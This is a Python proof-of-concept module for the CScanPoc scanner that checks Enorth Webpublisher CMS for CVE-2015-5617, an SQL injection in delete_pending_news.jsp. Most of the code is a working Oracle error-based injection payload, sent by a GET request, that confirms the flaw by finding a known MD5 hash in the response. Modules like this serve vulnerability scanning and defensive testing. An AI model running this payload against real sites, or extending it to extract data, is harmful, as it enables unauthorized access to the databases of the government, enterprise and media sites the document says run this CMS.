# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Enorth-Webpublisher-CMS_0000'  # 平台漏洞编号
    name = 'Enorth Webpublisher CMS SQL Injection from delete_pending_news.jsp'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-02'  # 漏洞公布时间
    desc = '''
        Enorth Webpublisher CMS so far of the scale of tens of thousands of web sites, with the government, enterprises, scientific research and education and media industries fields such as nearly thousands of business users.
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-89306'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-5617'  # cve编号
    product = 'Enorth-Webpublisher-CMS'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '57b5e2c6-c1f1-4aaa-89fc-782093b2182c'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/pub/m_pending_news/delete_pending_news.jsp?cbNewsId=1)%20and%201=ctxsys.drithsx.sn(1,(Utl_Raw.Cast_To_Raw(sys.dbms_obfuscation_toolkit.md5(input_string => '3.14'))))?"
            vul_url = arg + payload
            response = requests.get(vul_url).text
            if '4beed3b9c4a886067de0e3a094246f78' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
